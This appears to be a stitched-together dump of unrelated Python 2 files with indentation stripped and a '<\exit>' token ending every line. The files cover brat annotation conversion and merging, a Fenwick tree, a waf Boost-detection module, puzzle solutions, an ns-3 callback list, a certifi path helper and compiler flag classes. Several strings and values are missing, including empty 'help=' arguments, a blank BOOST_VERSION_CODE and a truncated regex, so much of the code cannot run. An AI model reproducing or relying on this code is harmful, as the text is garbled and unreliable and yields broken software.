if id_ == 'NULL':<\exit>
return 0<\exit>
start, end = int(start), int(end)<\exit>
except:<\exit>
print >> sys.stderr, 'Format error: %s' % l<\exit>
raise<\exit>
converted.append('T%s\t%s %d %d\t%s' % (id_, options.entitytype,<\exit>
start, end, text))<\exit>
if not options.no_norm:<\exit>
converted.append('N%s\tReference T%s %s' % (id_, id_, eid))<\exit>
def output_(out, ann):<\exit>
for a in ann:<\exit>
print >> out, a<\exit>
def output(id_, ann, append):<\exit>
if not options.directory:<\exit>
output(sys.stdout, ann)<\exit>
else:<\exit>
fn = os.path.join(options.directory, id_+'.'+options.outsuffix)<\exit>
with open(fn, 'a' if append else 'w') as f:<\exit>
output_(f, ann)<\exit>
def process_(f, ids):<\exit>
ann, current, processed = [], None, set()<\exit>
for l in f:<\exit>
l = l.strip()<\exit>
id_ = l.split('\t')[0]<\exit>
if id_ == current:<\exit>
if id_ in ids:<\exit>
convert_line(l, ann)<\exit>
else:<\exit>
if current in ids:<\exit>
output(current, ann, current in processed)<\exit>
ann = []<\exit>
processed.add(current)<\exit>
if id_ in ids:<\exit>
if id_ in processed and options.verbose:<\exit>
print >> sys.stderr, 'Warning: %s split' % id_<\exit>
convert_line(l, ann)<\exit>
current = id_<\exit>
if ids == processed:<\exit>
break<\exit>
if ann:<\exit>
output(current, ann, current in processed)<\exit>
for id_ in ids - processed:<\exit>
print >> sys.stderr, 'Warning: id %s not found' % id_<\exit>
def process(fn, ids):<\exit>
try:<\exit>
with open(fn, 'rU') as f:<\exit>
header = f.readline()<\exit>
if not header.startswith('doc_id\tid'):<\exit>
print >> sys.stderr, 'Warning: %s missing header' % fn<\exit>
process_(f, ids)<\exit>
except IOError, e:<\exit>
print >> sys.stderr, e, '(try -f argument?)'<\exit>
def main(argv=None):<\exit>
global options<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
options = argparser().parse_args(argv[1:])<\exit>
ids = get_ids(options.id)<\exit>
process(options.file, ids)<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
class taggedEntity:<\exit>
def __init__(self, startOff, endOff, eType, idNum, fullText):<\exit>
self.startOff = startOff<\exit>
self.endOff   = endOff<\exit>
self.eType    = eType<\exit>
self.idNum    = idNum<\exit>
self.fullText = fullText<\exit>
self.eText = fullText[startOff:endOff]<\exit>
def __str__(self):<\exit>
return "T%d\t%s %d %d\t%s" % (self.idNum, self.eType, self.startOff,<\exit>
self.endOff, self.eText)<\exit>
def check(self):<\exit>
assert "\n" not in self.eText, \<\exit>
"ERROR: newline in entity: '%s'" % self.eText<\exit>
assert self.eText == self.eText.strip(), \<\exit>
"ERROR: entity contains extra whitespace: '%s'" % self.eText<\exit>
def BIO_to_standoff(BIOtext, reftext, tokenidx=2, tagidx=-1):<\exit>
BIOlines = BIOtext.split('\n')<\exit>
return BIO_lines_to_standoff(BIOlines, reftext, tokenidx, tagidx)<\exit>
next_free_id_idx = 1<\exit>
def BIO_lines_to_standoff(BIOlines, reftext, tokenidx=2, tagidx=-1):<\exit>
global next_free_id_idx<\exit>
taggedTokens = []<\exit>
ri, bi = 0, 0<\exit>
while(ri < len(reftext)):<\exit>
if bi >= len(BIOlines):<\exit>
print >> sys.stderr, "Warning: received BIO didn't cover given text"<\exit>
break<\exit>
BIOline = BIOlines[bi]<\exit>
if re.match(r'^\s*$', BIOline):<\exit>
bi += 1<\exit>
else:<\exit>
fields = BIOline.split('\t')<\exit>
try:<\exit>
tokentext = fields[tokenidx]<\exit>
except:<\exit>
print >> sys.stderr, "Error: failed to get token text " \<\exit>
"(field %d) on line: %s" % (tokenidx, BIOline)<\exit>
raise<\exit>
try:<\exit>
tag = fields[tagidx]<\exit>
except:<\exit>
print >> sys.stderr, "Error: failed to get token text " \<\exit>
"(field %d) on line: %s" % (tagidx, BIOline)<\exit>
raise<\exit>
m = re.match(r'^([BIO])((?:-[A-Za-z0-9_-]+)?)$', tag)<\exit>
assert m, "ERROR: failed to parse tag '%s'" % tag<\exit>
ttag, ttype = m.groups()<\exit>
if len(ttype) > 0 and ttype[0] == "-":<\exit>
ttype = ttype[1:]<\exit>
assert ((ttype == "" and ttag == "O") or<\exit>
(ttype != "" and ttag in ("B","I"))), \<\exit>
"Error: tag/type mismatch %s" % tag<\exit>
while ri < len(reftext) and reftext[ri].isspace():<\exit>
ri += 1<\exit>
assert reftext[ri:ri+len(tokentext)] == tokentext, \<\exit>
"ERROR: text mismatch: reference '%s' tagged '%s'" % \<\exit>
(reftext[ri:ri+len(tokentext)].encode("UTF-8"),<\exit>
tokentext.encode("UTF-8"))<\exit>
taggedTokens.append((ri, ri+len(tokentext), ttag, ttype))<\exit>
ri += len(tokentext)<\exit>
bi += 1<\exit>
while ri < len(reftext) and reftext[ri].isspace():<\exit>
ri += 1<\exit>
if (len([c for c in reftext[ri:] if not c.isspace()]) != 0 or<\exit>
len([c for c in BIOlines[bi:] if not re.match(r'^\s*$', c)]) != 0):<\exit>
assert False, "ERROR: failed alignment: '%s' remains in reference, " \<\exit>
"'%s' in tagged" % (reftext[ri:], BIOlines[bi:])<\exit>
standoff_entities = []<\exit>
revisedTagged = []<\exit>
prevTag = None<\exit>
for startoff, endoff, ttag, ttype in taggedTokens:<\exit>
if prevTag == "O" and ttag == "I":<\exit>
print >> sys.stderr, "Note: rewriting \"I\" -> \"B\" after \"O\""<\exit>
ttag = "B"<\exit>
revisedTagged.append((startoff, endoff, ttag, ttype))<\exit>
prevTag = ttag<\exit>
taggedTokens = revisedTagged<\exit>
revisedTagged = []<\exit>
prevTag, prevType = None, None<\exit>
for startoff, endoff, ttag, ttype in taggedTokens:<\exit>
if prevTag in ("B", "I") and ttag == "I" and prevType != ttype:<\exit>
print >> sys.stderr, "Note: rewriting \"I\" -> \"B\" at type switch"<\exit>
ttag = "B"<\exit>
revisedTagged.append((startoff, endoff, ttag, ttype))<\exit>
prevTag, prevType = ttag, ttype<\exit>
taggedTokens = revisedTagged<\exit>
prevTag, prevEnd = "O", 0<\exit>
currType, currStart = None, None<\exit>
for startoff, endoff, ttag, ttype in taggedTokens:<\exit>
if prevTag != "O" and ttag != "I":<\exit>
assert currType is not None and currStart is not None, \<\exit>
"ERROR in %s" % fn<\exit>
standoff_entities.append(taggedEntity(currStart, prevEnd, currType,<\exit>
next_free_id_idx, reftext))<\exit>
next_free_id_idx += 1<\exit>
currType, currStart = None, None<\exit>
elif prevTag != "O":<\exit>
assert ttag == "I", "ERROR in %s" % fn<\exit>
assert currType == ttype, "ERROR: entity of type '%s' continues " \<\exit>
"as type '%s'" % (currType, ttype)<\exit>
if ttag == "B":<\exit>
currType, currStart = ttype, startoff<\exit>
prevTag, prevEnd = ttag, endoff<\exit>
if prevTag != "O":<\exit>
standoff_entities.append(taggedEntity(currStart, prevEnd, currType,<\exit>
next_free_id_idx, reftext))<\exit>
next_free_id_idx += 1<\exit>
for e in standoff_entities:<\exit>
e.check()<\exit>
return standoff_entities<\exit>
RANGE_RE = re.compile(r'^(-?\d+)-(-?\d+)$')<\exit>
def parse_indices(idxstr):<\exit>
indices = []<\exit>
for i in idxstr.split(','):<\exit>
if not RANGE_RE.match(i):<\exit>
indices.append(int(i))<\exit>
else:<\exit>
start, end = RANGE_RE.match(i).groups()<\exit>
for j in range(int(start), int(end)):<\exit>
indices.append(j)<\exit>
return indices<\exit>
def main(argv):<\exit>
if len(argv) < 3 or len(argv) > 5:<\exit>
print >> sys.stderr, "Usage:", argv[0], "TEXTFILE BIOFILE [TOKENIDX [BIOIDX]]"<\exit>
return 1<\exit>
textfn, biofn = argv[1], argv[2]<\exit>
tokenIdx = None<\exit>
if len(argv) >= 4:<\exit>
tokenIdx = int(argv[3])<\exit>
bioIdx = None<\exit>
if len(argv) >= 5:<\exit>
bioIdx = argv[4]<\exit>
with open(textfn, 'rU') as textf:<\exit>
text = textf.read()<\exit>
with open(biofn, 'rU') as biof:<\exit>
bio = biof.read()<\exit>
if tokenIdx is None:<\exit>
so = BIO_to_standoff(bio, text)<\exit>
elif bioIdx is None:<\exit>
so = BIO_to_standoff(bio, text, tokenIdx)<\exit>
else:<\exit>
try:<\exit>
indices = parse_indices(bioIdx)<\exit>
except:<\exit>
print >> sys.stderr, 'Error: failed to parse indices "%s"' % bioIdx<\exit>
return 1<\exit>
so = []<\exit>
for i in indices:<\exit>
so.extend(BIO_to_standoff(bio, text, tokenIdx, i))<\exit>
for s in so:<\exit>
print s<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
class BIT(object):<\exit>
def __init__(self, n):<\exit>
self.N = [0 for _ in xrange(n+1)]<\exit>
def lowbit(self, x):<\exit>
return x & -x<\exit>
def set(self, i, val):<\exit>
while i < len(self.N):<\exit>
self.N[i] += val<\exit>
i += self.lowbit(i)<\exit>
def pre_sum(self, i):<\exit>
ret = 0<\exit>
while i > 0:<\exit>
ret += self.N[i]<\exit>
i -= self.lowbit(i)<\exit>
return ret<\exit>
@staticmethod<\exit>
def test():<\exit>
A = [1, 2, 3, 4, 5]<\exit>
n = len(A)<\exit>
bit = BIT(n)<\exit>
for i in xrange(n):<\exit>
bit.set(i+1, A[i])<\exit>
for i in xrange(n):<\exit>
print bit.pre_sum(i+1)<\exit>
if __name__ == "__main__":<\exit>
BIT.test()<\exit>
import sys<\exit>
import re<\exit>
from waflib import Utils, Logs<\exit>
from waflib.Configure import conf<\exit>
from waflib.Errors import WafError<\exit>
BOOST_LIBS = ('/usr/lib/x86_64-linux-gnu', '/usr/lib/i386-linux-gnu', '/usr/lib', '/usr/local/lib',<\exit>
'/opt/local/lib', '/sw/lib', '/lib')<\exit>
BOOST_INCLUDES = ('/usr/include', '/usr/local/include',<\exit>
'/opt/local/include', '/sw/include')<\exit>
BOOST_VERSION_FILE = 'boost/version.hpp'<\exit>
BOOST_VERSION_CODE =<\exit>
PLATFORM = Utils.unversioned_sys_platform()<\exit>
detect_intel = lambda env: (PLATFORM == 'win32') and 'iw' or 'il'<\exit>
detect_clang = lambda env: (PLATFORM == 'darwin') and 'clang-darwin' or 'clang'<\exit>
detect_mingw = lambda env: (re.search('MinGW', env.CXX[0])) and 'mgw' or 'gcc'<\exit>
BOOST_TOOLSETS = {<\exit>
'borland':  'bcb',<\exit>
'clang':	detect_clang,<\exit>
'como':	 'como',<\exit>
'cw':	   'cw',<\exit>
'darwin':   'xgcc',<\exit>
'edg':	  'edg',<\exit>
'g++':	  detect_mingw,<\exit>
'gcc':	  detect_mingw,<\exit>
'icpc':	 detect_intel,<\exit>
'intel':	detect_intel,<\exit>
'kcc':	  'kcc',<\exit>
'kylix':	'bck',<\exit>
'mipspro':  'mp',<\exit>
'mingw':	'mgw',<\exit>
'msvc':	 'vc',<\exit>
'qcc':	  'qcc',<\exit>
'sun':	  'sw',<\exit>
'sunc++':   'sw',<\exit>
'tru64cxx': 'tru',<\exit>
'vacpp':	'xlc'<\exit>
}<\exit>
def options(opt):<\exit>
opt.add_option('--boost-includes', type='string',<\exit>
default='', dest='boost_includes',<\exit>
help=)<\exit>
opt.add_option('--boost-libs', type='string',<\exit>
default='', dest='boost_libs',<\exit>
help=)<\exit>
opt.add_option('--boost-static', action='store_true',<\exit>
default=False, dest='boost_static',<\exit>
help='link static libraries')<\exit>
opt.add_option('--boost-mt', action='store_true',<\exit>
default=False, dest='boost_mt',<\exit>
help='select multi-threaded libraries')<\exit>
opt.add_option('--boost-abi', type='string', default='', dest='boost_abi',<\exit>
help=)<\exit>
opt.add_option('--boost-toolset', type='string',<\exit>
default='', dest='boost_toolset',<\exit>
help='force a toolset e.g. msvc, vc90, \<\exit>
gcc, mingw, mgw45 (default: auto)')<\exit>
py_version = '%d%d' % (sys.version_info[0], sys.version_info[1])<\exit>
opt.add_option('--boost-python', type='string',<\exit>
default=py_version, dest='boost_python',<\exit>
help='select the lib python with this version \<\exit>
(default: %s)' % py_version)<\exit>
@conf<\exit>
def __boost_get_version_file(self, dir):<\exit>
try:<\exit>
return self.root.find_dir(dir).find_node(BOOST_VERSION_FILE)<\exit>
except:<\exit>
return None<\exit>
@conf<\exit>
def boost_get_version(self, dir):<\exit>
re_but = re.compile('^<\exit>
try:<\exit>
val = re_but.search(self.__boost_get_version_file(dir).read()).group(1)<\exit>
except:<\exit>
val = self.check_cxx(fragment=BOOST_VERSION_CODE, includes=[dir],<\exit>
execute=True, define_ret=True)<\exit>
return val<\exit>
@conf<\exit>
def boost_get_includes(self, *k, **kw):<\exit>
includes = k and k[0] or kw.get('includes', None)<\exit>
if includes and self.__boost_get_version_file(includes):<\exit>
return includes<\exit>
for dir in BOOST_INCLUDES:<\exit>
if self.__boost_get_version_file(dir):<\exit>
return dir<\exit>
if includes:<\exit>
self.fatal('headers not found in %s' % includes)<\exit>
else:<\exit>
self.fatal('headers not found, use --boost-includes=/path/to/boost')<\exit>
@conf<\exit>
def boost_get_toolset(self, cc):<\exit>
toolset = cc<\exit>
if not cc:<\exit>
build_platform = Utils.unversioned_sys_platform()<\exit>
if build_platform in BOOST_TOOLSETS:<\exit>
cc = build_platform<\exit>
else:<\exit>
cc = self.env.CXX_NAME<\exit>
if cc in BOOST_TOOLSETS:<\exit>
toolset = BOOST_TOOLSETS[cc]<\exit>
return isinstance(toolset, str) and toolset or toolset(self.env)<\exit>
@conf<\exit>
def __boost_get_libs_path(self, *k, **kw):<\exit>
if 'files' in kw:<\exit>
return self.root.find_dir('.'), Utils.to_list(kw['files'])<\exit>
libs = k and k[0] or kw.get('libs', None)<\exit>
if libs:<\exit>
path = self.root.find_dir(libs)<\exit>
files = path.ant_glob('*boost_*')<\exit>
if not libs or not files:<\exit>
for dir in BOOST_LIBS:<\exit>
try:<\exit>
path = self.root.find_dir(dir)<\exit>
files = path.ant_glob('*boost_*')<\exit>
if files:<\exit>
break<\exit>
path = self.root.find_dir(dir + '64')<\exit>
files = path.ant_glob('*boost_*')<\exit>
if files:<\exit>
break<\exit>
except:<\exit>
path = None<\exit>
if not path:<\exit>
if libs:<\exit>
self.fatal('libs not found in %s' % libs)<\exit>
else:<\exit>
self.fatal('libs not found, \<\exit>
use --boost-includes=/path/to/boost/lib')<\exit>
return path, files<\exit>
@conf<\exit>
def boost_get_libs(self, *k, **kw):<\exit>
path, files = self.__boost_get_libs_path(**kw)<\exit>
t = []<\exit>
if kw.get('mt', False):<\exit>
t.append('mt')<\exit>
if kw.get('abi', None):<\exit>
t.append(kw['abi'])<\exit>
tags = t and '(-%s)+' % '-'.join(t) or ''<\exit>
toolset = '(-%s[0-9]{0,3})+' % self.boost_get_toolset(kw.get('toolset', ''))<\exit>
version = '(-%s)+' % self.env.BOOST_VERSION<\exit>
def find_lib(re_lib, files):<\exit>
for file in files:<\exit>
if re_lib.search(file.name):<\exit>
return file<\exit>
return None<\exit>
def format_lib_name(name):<\exit>
if name.startswith('lib'):<\exit>
name = name[3:]<\exit>
return name.split('.')[0]<\exit>
libs = []<\exit>
for lib in Utils.to_list(k and k[0] or kw.get('lib', None)):<\exit>
py = (lib == 'python') and '(-py%s)+' % kw['python'] or ''<\exit>
for pattern in ['boost_%s%s%s%s%s' % (lib, toolset, tags, py, version),<\exit>
'boost_%s%s%s%s' % (lib, tags, py, version),<\exit>
'boost_%s%s%s' % (lib, tags, version),<\exit>
'boost_%s%s%s%s' % (lib, toolset, tags, py),<\exit>
'boost_%s%s%s' % (lib, tags, py),<\exit>
'boost_%s%s' % (lib, tags)]:<\exit>
file = find_lib(re.compile(pattern), files)<\exit>
if file:<\exit>
libs.append(format_lib_name(file.name))<\exit>
break<\exit>
else:<\exit>
self.fatal('lib %s not found in %s' % (lib, path))<\exit>
return path.abspath(), libs<\exit>
@conf<\exit>
def check_boost(self, *k, **kw):<\exit>
if not self.env['CXX']:<\exit>
self.fatal('load a c++ compiler first, conf.load("compiler_cxx")')<\exit>
params = {'lib': k and k[0] or kw.get('lib', None)}<\exit>
for key, value in self.options.__dict__.items():<\exit>
if not key.startswith('boost_'):<\exit>
continue<\exit>
key = key[len('boost_'):]<\exit>
params[key] = value and value or kw.get(key, '')<\exit>
var = kw.get('uselib_store', 'BOOST')<\exit>
self.start_msg('Checking boost includes')<\exit>
try:<\exit>
self.env['INCLUDES_%s' % var] = self.boost_get_includes(**params)<\exit>
self.env.BOOST_VERSION = self.boost_get_version(self.env['INCLUDES_%s' % var])<\exit>
except WafError:<\exit>
self.end_msg("not found", 'YELLOW')<\exit>
raise<\exit>
self.end_msg(self.env.BOOST_VERSION)<\exit>
if Logs.verbose:<\exit>
Logs.pprint('CYAN', '	path : %s' % self.env['INCLUDES_%s' % var])<\exit>
if not params['lib']:<\exit>
return<\exit>
self.start_msg('Checking boost libs')<\exit>
try:<\exit>
suffix = params.get('static', 'ST') or ''<\exit>
path, libs = self.boost_get_libs(**params)<\exit>
except WafError:<\exit>
self.end_msg("not found", 'YELLOW')<\exit>
raise<\exit>
self.env['%sLIBPATH_%s' % (suffix, var)] = [path]<\exit>
self.env['%sLIB_%s' % (suffix, var)] = libs<\exit>
self.end_msg('ok')<\exit>
if Logs.verbose:<\exit>
Logs.pprint('CYAN', '	path : %s' % path)<\exit>
Logs.pprint('CYAN', '	libs : %s' % libs)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
s = cipher<\exit>
s = "".join(sorted(list(s)))<\exit>
result = []<\exit>
self.dfs(s, "", result)<\exit>
return "\n".join(result[1:])<\exit>
def dfs(self, seq, cur, result):<\exit>
result.append(cur)<\exit>
if seq:<\exit>
for i in xrange(len(seq)):<\exit>
self.dfs(seq[i + 1:], cur + seq[i], result)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import heapq<\exit>
from collections import defaultdict<\exit>
class Building(object):<\exit>
def __init__(self, h):<\exit>
self.h = h<\exit>
self.deleted = False<\exit>
def __cmp__(self, other):<\exit>
return other.h - self.h<\exit>
class Event(object):<\exit>
def __init__(self):<\exit>
self.starts = []<\exit>
self.ends = []<\exit>
class Solution:<\exit>
def buildingOutline(self, buildings):<\exit>
events = defaultdict(Event)<\exit>
for start, end, height in buildings:<\exit>
building = Building(height)<\exit>
events[start].starts.append(building)<\exit>
events[end].ends.append(building)<\exit>
ret = []<\exit>
cur_heap = []<\exit>
cur_max_hi = 0<\exit>
begin = None<\exit>
for x, event in sorted(events.items()):<\exit>
for building in event.starts:<\exit>
heapq.heappush(cur_heap, building)<\exit>
for building in event.ends:<\exit>
building.deleted = True<\exit>
while cur_heap and cur_heap[0].deleted:<\exit>
heapq.heappop(cur_heap)<\exit>
new_hi = cur_heap[0].h if cur_heap else 0<\exit>
if cur_max_hi != new_hi:<\exit>
if cur_max_hi != 0:<\exit>
ret.append([begin, x, cur_max_hi])<\exit>
begin = x<\exit>
cur_max_hi = new_hi<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().buildingOutline([<\exit>
[1, 3, 3],<\exit>
[2, 4, 4],<\exit>
[5, 6, 1]<\exit>
]) == [[1, 2, 3], [2, 4, 4], [5, 6, 1]]<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N = len(cipher)<\exit>
sum_set = set()<\exit>
s = 0<\exit>
for val in cipher:<\exit>
s += val<\exit>
sum_set.add(s)<\exit>
result = []<\exit>
for k in sum_set:<\exit>
if s % k == 0:<\exit>
j = 1<\exit>
while j < s / k + 1 and j * k in sum_set:<\exit>
j += 1<\exit>
if j == s / k + 1:<\exit>
result.append(k)<\exit>
result.sort()<\exit>
return " ".join(map(str, result))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
from scipy import integrate<\exit>
def integral(f, l, u):<\exit>
ret = integrate.quad(f, l, u)<\exit>
return ret<\exit>
callback_classes = [<\exit>
['void', 'ns3::Ptr<ns3::NetDevice>', 'ns3::Ptr<ns3::Packet const>', 'unsigned short', 'ns3::Address const&', 'ns3::Address const&', 'ns3::NetDevice::PacketType', 'ns3::empty', 'ns3::empty', 'ns3::empty'],<\exit>
['void', 'ns3::Ptr<ns3::PacketBurst const>', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],<\exit>
['void', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],<\exit>
['bool', 'ns3::Ptr<ns3::NetDevice>', 'ns3::Ptr<ns3::Packet const>', 'unsigned short', 'ns3::Address const&', 'ns3::Address const&', 'ns3::NetDevice::PacketType', 'ns3::empty', 'ns3::empty', 'ns3::empty'],<\exit>
['bool', 'ns3::Ptr<ns3::NetDevice>', 'ns3::Ptr<ns3::Packet const>', 'unsigned short', 'ns3::Address const&', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],<\exit>
['void', 'bool', 'unsigned long', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],<\exit>
]<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
def parse_id(l):<\exit>
m = re.match(r'^((\S)(\S*))', l)<\exit>
assert m, "Failed to parse ID: %s" % l<\exit>
return m.groups()<\exit>
def parse_key_value(kv):<\exit>
m = re.match(r'^(\S+):(\S+)$', kv)<\exit>
assert m, "Failed to parse key-value pair: %s" % kv<\exit>
return m.groups()<\exit>
def join_key_value(k, v):<\exit>
return "%s:%s" % (k, v)<\exit>
def remap_key_values(kvs, idmap):<\exit>
remapped = []<\exit>
for kv in kvs:<\exit>
k, v = parse_key_value(kv)<\exit>
v = idmap.get(v, v)<\exit>
remapped.append(join_key_value(k, v))<\exit>
return remapped<\exit>
def remap_relation_idrefs(l, idmap):<\exit>
fields = l.split('\t')<\exit>
assert len(fields) >= 2, "format error"<\exit>
type_args = fields[1].split(" ")<\exit>
assert len(type_args) >= 3, "format error"<\exit>
args = type_args[1:]<\exit>
args = remap_key_values(args, idmap)<\exit>
fields[1] = " ".join(type_args[:1]+args)<\exit>
return '\t'.join(fields)<\exit>
def remap_event_idrefs(l, idmap):<\exit>
fields = l.split('\t')<\exit>
assert len(fields) >= 2, "format error"<\exit>
type_args = fields[1].split(" ")<\exit>
type_args = remap_key_values(type_args, idmap)<\exit>
fields[1] = " ".join(type_args)<\exit>
return '\t'.join(fields)<\exit>
def remap_attrib_idrefs(l, idmap):<\exit>
fields = l.split('\t')<\exit>
assert len(fields) >= 2, "format error"<\exit>
type_args = fields[1].split(" ")<\exit>
assert len(type_args) >= 2, "format error"<\exit>
args = type_args[1:]<\exit>
args = [idmap.get(a,a) for a in args]<\exit>
fields[1] = " ".join(type_args[:1]+args)<\exit>
return '\t'.join(fields)<\exit>
def remap_note_idrefs(l, idmap):<\exit>
return remap_attrib_idrefs(l, idmap)<\exit>
def remap_equiv_idrefs(l, idmap):<\exit>
fields = l.split('\t')<\exit>
assert len(fields) >= 2, "format error"<\exit>
type_args = fields[1].split(" ")<\exit>
assert len(type_args) >= 3, "format error"<\exit>
args = type_args[1:]<\exit>
args = [idmap.get(a,a) for a in args]<\exit>
fields[1] = " ".join(type_args[:1]+args)<\exit>
return '\t'.join(fields)<\exit>
def main(argv):<\exit>
filenames = argv[1:]<\exit>
anns = []<\exit>
texts = []<\exit>
for fn in filenames:<\exit>
assert re.search(r'\.ann$', fn), 'Error: argument %s not a .ann file.' % fn<\exit>
txtfn = re.sub(r'\.ann$', '.txt', fn)<\exit>
with codecs.open(fn, 'r', encoding='utf-8') as annf:<\exit>
anns.append(annf.readlines())<\exit>
with codecs.open(txtfn, 'r', encoding='utf-8') as txtf:<\exit>
texts.append(txtf.read())<\exit>
baseoff = 0<\exit>
for i in range(len(anns)):<\exit>
for j in range(len(anns[i])):<\exit>
l = anns[i][j]<\exit>
if not l or l[0] != 'T':<\exit>
continue<\exit>
m = re.match(r'^(T\d+\t\S+) (\d+ \d+(?:;\d+ \d+)*)(\t.*\n?)', l)<\exit>
assert m, 'failed to parse "%s"' % l<\exit>
begin, offsets, end = m.groups()<\exit>
new_offsets = []<\exit>
for offset in offsets.split(';'):<\exit>
startoff, endoff = offset.split(' ')<\exit>
startoff = int(startoff) + baseoff<\exit>
endoff   = int(endoff) + baseoff<\exit>
new_offsets.append('%d %d' % (startoff, endoff))<\exit>
offsets = ';'.join(new_offsets)<\exit>
anns[i][j] = "%s %s%s" % (begin, offsets, end)<\exit>
baseoff += len(texts[i])<\exit>
reserved_id = {}<\exit>
for i in range(len(anns)):<\exit>
for l in anns[i]:<\exit>
aid, idchar, idseq = parse_id(l)<\exit>
reserved_id[aid] = (idchar, idseq)<\exit>
idchars = set([aid[0] for aid in reserved_id])<\exit>
next_free_seq = {}<\exit>
for c in idchars:<\exit>
maxseq = 1<\exit>
for aid in [a for a in reserved_id if a[0] == c]:<\exit>
idchar, idseq = reserved_id[aid]<\exit>
try:<\exit>
idseq = int(idseq)<\exit>
maxseq = max(idseq, maxseq)<\exit>
except ValueError:<\exit>
pass<\exit>
next_free_seq[c] = maxseq + 1<\exit>
reserved = {}<\exit>
for i in range(len(anns)):<\exit>
idmap = {}<\exit>
for j in range(len(anns[i])):<\exit>
l = anns[i][j]<\exit>
aid, idchar, idseq = parse_id(l)<\exit>
if aid == '*':<\exit>
continue<\exit>
if aid not in reserved:<\exit>
reserved[aid] = True<\exit>
else:<\exit>
newid = "%s%d" % (idchar, next_free_seq[idchar])<\exit>
next_free_seq[idchar] += 1<\exit>
assert aid not in idmap<\exit>
idmap[aid] = newid<\exit>
l = "\t".join([newid]+l.split('\t')[1:])<\exit>
reserved[newid] = True<\exit>
anns[i][j] = l<\exit>
for j in range(len(anns[i])):<\exit>
l = anns[i][j].rstrip()<\exit>
tail = anns[i][j][len(l):]<\exit>
aid, idchar, idseq = parse_id(l)<\exit>
if idchar == "T":<\exit>
pass<\exit>
elif idchar == "R":<\exit>
l = remap_relation_idrefs(l, idmap)<\exit>
elif idchar == "E":<\exit>
l = remap_event_idrefs(l, idmap)<\exit>
elif idchar == "M" or idchar == "A":<\exit>
l = remap_attrib_idrefs(l, idmap)<\exit>
elif idchar == "*":<\exit>
l = remap_equiv_idrefs(l, idmap)<\exit>
elif idchar == "#":<\exit>
l = remap_note_idrefs(l, idmap)<\exit>
else:<\exit>
print >> sys.stderr, "Warning: unrecognized annotation, cannot remap ID references: %s" % l<\exit>
anns[i][j] = l+tail<\exit>
for i in range(len(anns)):<\exit>
for l in anns[i]:<\exit>
sys.stdout.write(l.encode('utf-8'))<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import os<\exit>
try:<\exit>
import certifi<\exit>
except ImportError:<\exit>
certifi = None<\exit>
def where():<\exit>
if certifi:<\exit>
return certifi.where()<\exit>
else:<\exit>
f = os.path.split(__file__)[0]<\exit>
return os.path.join(f, 'cacert.pem')<\exit>
if __name__ == '__main__':<\exit>
print(where())<\exit>
import Logs<\exit>
import Options<\exit>
import Utils<\exit>
class CompilerTraits(object):<\exit>
def get_warnings_flags(self, level):<\exit>
raise NotImplementedError<\exit>
def get_optimization_flags(self, level):<\exit>
raise NotImplementedError<\exit>
def get_debug_flags(self, level):<\exit>
raise NotImplementedError<\exit>
class GccTraits(CompilerTraits):<\exit>
def __init__(self):<\exit>
super(GccTraits, self).__init__()<\exit>
self.warnings_flags = [['-Wall'], ['-Werror'], ['-Wextra']]<\exit>
def get_warnings_flags(self, level):<\exit>
warnings = []<\exit>
for l in range(level):<\exit>
if l < len(self.warnings_flags):<\exit>
warnings.extend(self.warnings_flags[l])<\exit>
else:<\exit>
break<\exit>
return warnings<\exit>
def get_optimization_flags(self, level):<\exit>
if level == 0:<\exit>
return ['-O0']<\exit>
elif level == 1:<\exit>
return ['-O']<\exit>
elif level == 2:<\exit>
return ['-O2']<\exit>
elif level == 3:<\exit>
return ['-O3']<\exit>
def get_debug_flags(self, level):<\exit>
if level == 0:<\exit>
return (['-g0'], ['NDEBUG'])<\exit>
elif level == 1:<\exit>
return (['-g'], [])<\exit>
elif level >= 2:<\exit>
return (['-ggdb', '-g3'], ['_DEBUG'])<\exit>
class IccTraits(CompilerTraits):<\exit>
def __init__(self):<\exit>
super(IccTraits, self).__init__()<\exit>
self.warnings_flags = [[], [], ['-Wall']]<\exit>
def get_warnings_flags(self, level):<\exit>
warnings = []<\exit>
for l in range(level):<\exit>
if l < len(self.warnings_flags):<\exit>
warnings.extend(self.warnings_flags[l])<\exit>
else:<\exit>
break<\exit>
return warnings<\exit>
def get_optimization_flags(self, level):<\exit>
if level == 0:<\exit>
return ['-O0']<\exit>
elif level == 1:<\exit>
return ['-O']<\exit>
elif level == 2:<\exit>
return ['-O2']<\exit>
elif level == 3:<\exit>
return ['-O3']<\exit>
def get_debug_flags(self, level):<\exit>
if level == 0:<\exit>
return (['-g0'], ['NDEBUG'])<\exit>
elif level == 1:<\exit>
return (['-g'], [])<\exit>
elif level >= 2:<\exit>
return (['-ggdb', '-g3'], ['_DEBUG'])<\exit>
class MsvcTraits(CompilerTraits):<\exit>
def __init__(self):<\exit>
